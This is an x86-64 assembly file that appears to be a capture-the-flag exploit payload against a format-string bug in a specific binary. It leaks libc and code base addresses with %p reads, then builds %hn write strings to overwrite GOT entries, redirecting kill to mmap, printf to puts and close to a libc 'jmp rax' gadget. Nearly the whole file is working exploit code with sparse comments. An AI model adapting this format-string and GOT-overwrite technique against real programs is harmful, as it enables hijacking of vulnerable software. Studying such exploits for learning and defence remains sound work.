section .text
global _start

; fd: 5->read, 6->write
; syscall: 0->read, 1->write

; rax: syscall number
; rdi: fd
; rsi; buf
; rdx; count

; r14 == mmap base
; 0x800: read
; 0x900: write
; 0xe00: stack
; 34 => libc, 38 => code
; address => 0x804 ~ 0x810

_start:
inif_proc:
    mov r14, rdx
    lea rbp, [r14+0xe10]
    lea rsp, [r14+0xe10]

    ; ---- get libc ----
    mov rbx, 0x007024343325514d ; MQ%34$p
    mov qword [r14+0x900], rbx
    call w_something
    call r_something
    
    mov r9, 0x26b6b
    mov r11, 0xb10 ; 0xb10~0xb18: libc_base
    call decode_set

    ; ---- get code section ----
    mov rbx, 0x007024383325514d ; MQ%38$p
    mov qword [r14+0x900], rbx
    call w_something
    call r_something
    
    mov r9, 0x138f
    mov r11, 0xb18 ; 0xb18~0xb20: code_base
    call decode_set
    
    ; ---- get gadget 3 address ----
    mov rbx, 0x007024363325514d ; MQ%36$p
    mov qword [r14+0x900], rbx
    call w_something
    call r_something
    
    mov r9, 56
    mov r11, 0xb20 ; 0xb20~0xb28: gadget 3 address
    call decode_set
    
    ; ########### start write rbp chain ###########
    ; kill (got offset: 0x4060) => mmap (offset: 0x1957)
    ; close (got offset: 0x4030) => jmp rax (offset: 0xe0ee90)

    ; ---- step 0. 36 write 62 point to 55 ----
    ; ---- create format string 1 ----    
    movzx rbx, word [r14+0xb20] ; get gadget 3 address
    mov r13, 36 ; fmt offset
    call number_2_string_fmt 
    call w_something
    mov rax, rbx
    call clear_pipe
    
    ; ---- kill got to mmap ----
    movzx r10, word [r14+0xb18] ; get code base
    add r10, 0x4060 ; kill got offset
    movzx r12, word [r14+0xb18] ; get code base
    add r12, 0x1957 ; target value == mmap in main()
    call fmt_write
     
    ; ---- printf got to puts plt ----
    movzx r10, word [r14+0xb18] ; get code base
    add r10, 0x4028 ; kill got offset
    movzx r12, word [r14+0xb18] ; get code base
    add r12, 0x1036 ; target value == mmap in main()
    call fmt_write
    
    ; ---- close got to jmp rax part.1 ----
    movzx r10, word [r14+0xb18] ; get code base
    add r10, 0x4030 ; close got offset
    movzx r12, word [r14+0xb10] ; get libc base
    add r12, 0x6eb5 ; jmp rax offset
    call fmt_write

    ; ---- close got to jmp rax part.2 ----
    movzx r10, word [r14+0xb18] ; get code base
    add r10, 0x4032 ; close got offset
    movzx r12, word [r14+0xb12] ; get libc base + 0x2
    add r12, 0x2 ; jmp rax offset
    call fmt_write
    
    mov rbx, 0x0047 ; G
    mov qword [r14+0x900], rbx
    call w_something

    nop
    nop
    nop
    nop
    nop
    nop
    
    
; argument
;   r10: write got
;   r12: write value
fmt_write:
    ; ---- step 1. 62 write 55 point to got ----
    ; ---- create format string 1 ----
    mov rbx, r10
    mov r13, 62 ; offset
    call number_2_string_fmt 
    call w_something
    mov rax, rbx
    call clear_pipe

    ; ---- step 2. 56 write kill got to target value ----
    ; ---- create format string 1 ----    
    mov rbx, r12
    mov r13, 55 ; offset
    call number_2_string_fmt 
    nop
    call w_something
    mov rax, rbx
    call clear_pipe
    ret

; read thing in 0x800
; write thing in 0x900
w_something:
    mov rdi, 0x6
    lea rsi, [r14+0x900]
    mov rdx, 0x10
    mov rax, 0x1
    syscall ; first write
    ret

r_something:
    mov rdi, 0x3
    mov rdx, 0x10
    lea rsi, [r14+0x800]
    xor rax, rax
    syscall
    ret

; rax: num
clear_pipe: 
    xor rcx, rcx
    mov cx, 0x1000 ; divisor in rcx
    div rcx
    mov ebx, eax
clear_not_done:
    mov rdi, 0x3
    mov rdx, 0x100
    lea rsi, [r14+0xd00]
    xor rax, rax
    syscall
    
    dec ebx
    cmp ebx, 0
    jne clear_not_done
    ret

; rcx: counter
; r15: value
; rbx: target
; argument
;   r9: offset
;   r11: target offset
decode_set:
    xor rcx, rcx
    xor r15, r15
    xor rbx, rbx
    lea rax, [r14+0x804]
num:
    shl r15, 4
    mov bl, byte [rax + rcx]
    cmp bl, 0x39 ; '9'
    jg alpha
    sub rbx, 0x30
    add r15, rbx
    jmp decode_done
alpha:
    sub rbx, 0x57
    add r15, rbx
decode_done:
    inc cx
    cmp cx, 11
    jle num
    sub r15, r9
    lea rbx, [r14 + r11]
    mov qword [rbx], r15
    ret

; rbx: return
; argument
;   rbx: value
;   r13: offset
; target: MQ%00000 c%XX$hn\x00
;            XXXXX
number_2_string_fmt:
    mov rcx, 0x303030303025514d ; MQ%00000
    mov qword [r14+0x900], rcx
    mov rcx, 0x6e68245858256330 ; 0c%XX$hn
    mov qword [r14+0x908], rcx
    xor rcx, rcx ; \x00
    mov byte [r14+0x910], cl

    sub rbx, 2 ; for MQ pre-print
    mov rax, rbx ; dividend in rax
    mov r15, 0x908
    call digit_set

    mov rax, r13 ; offset
    mov r15, 0x90c
    call digit_set

    add rbx, 2 ; recover rbx
    ret

; argument
;   rax: value
digit_set:
    xor rcx, rcx
    mov cl, 20 ; divisor in rcx
    shr cl, 1 ; can't use 0xa
digit_part:
    xor rdx, rdx
    div rcx
    add rdx, 0x30 ; add 0x30 to ascii
    mov byte [r14+r15], dl
    dec r15
    test rax, rax
    jnz digit_part
    ret
